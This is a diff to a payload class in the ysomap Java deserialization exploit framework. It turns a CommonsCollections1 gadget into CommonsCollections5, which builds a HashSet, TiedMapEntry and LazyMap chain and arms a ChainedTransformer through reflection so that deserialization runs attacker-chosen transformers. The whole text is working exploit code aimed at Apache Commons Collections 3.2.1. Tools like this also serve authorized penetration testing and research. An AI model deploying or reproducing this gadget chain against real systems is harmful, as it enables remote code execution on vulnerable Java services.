@@ -1,63 +1,62 @@
-package ysomap.payloads.java.collections;
+package ysomap.payloads.java.commons.collection_v3;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import ysomap.bullets.Bullet;
-import ysomap.bullets.collections.TransformerBullet;
+import ysomap.bullets.collections.TransformerWithTemplatesImplBullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 import ysomap.payloads.AbstractPayload;
 
-import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Map;
 
 /**
- * ysoserial 的 CommonsCollections3 也可以用这个
+ * from ysoserial CommonsCollections6
  * @author wh1t3P1g
- * @since 2020/2/17
+ * @since 2020/2/18
  */
 @SuppressWarnings({"rawtypes","unchecked"})
-//@Payloads
+@Payloads
 @Targets({Targets.JDK})
-@Authors({ Authors.FROHOFF })
+@Authors({ Authors.MATTHIASKAISER })
 @Require(bullets = {"TransformerBullet",
         "TransformerWithJNDIBullet",
         "TransformerWithSleepBullet",
         "TransformerWithURLClassLoaderBullet",
         "TransformerWithFileWriteBullet"}, param = false)
-@Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
-public class CommonsCollections1 extends AbstractPayload<InvocationHandler> {
+@Dependencies({"commons-collections:commons-collections:3.2.1"})
+public class CommonsCollections5 extends AbstractPayload<HashSet> {
 
     @Override
     public boolean checkObject(Object obj) {
-        return obj instanceof org.apache.commons.collections.Transformer[];
+        return obj instanceof Transformer[];
     }
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return TransformerBullet.newInstance(args);
+        return new TransformerWithTemplatesImplBullet()
+                .set("args", args[0])
+                .set("version", "3");
     }
 
     @Override
-    public InvocationHandler pack(Object obj) throws Exception {
-        // inert chain for setup
-        final Transformer transformerChain = new ChainedTransformer(
-                new Transformer[]{ new ConstantTransformer(1) });
+    public HashSet pack(Object obj) throws Exception {
+        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+
         final Map innerMap = new HashMap();
 
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
 
-        final Map mapProxy = PayloadHelper.createMemoitizedProxy(lazyMap, Map.class);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
 
-        final InvocationHandler handler = PayloadHelper.createMemoizedInvocationHandler(mapProxy);
+        HashSet set = PayloadHelper.makeHashSetWithEntry(entry);
 
         ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain
-
-        return handler;
+        return set;
     }
-
 }
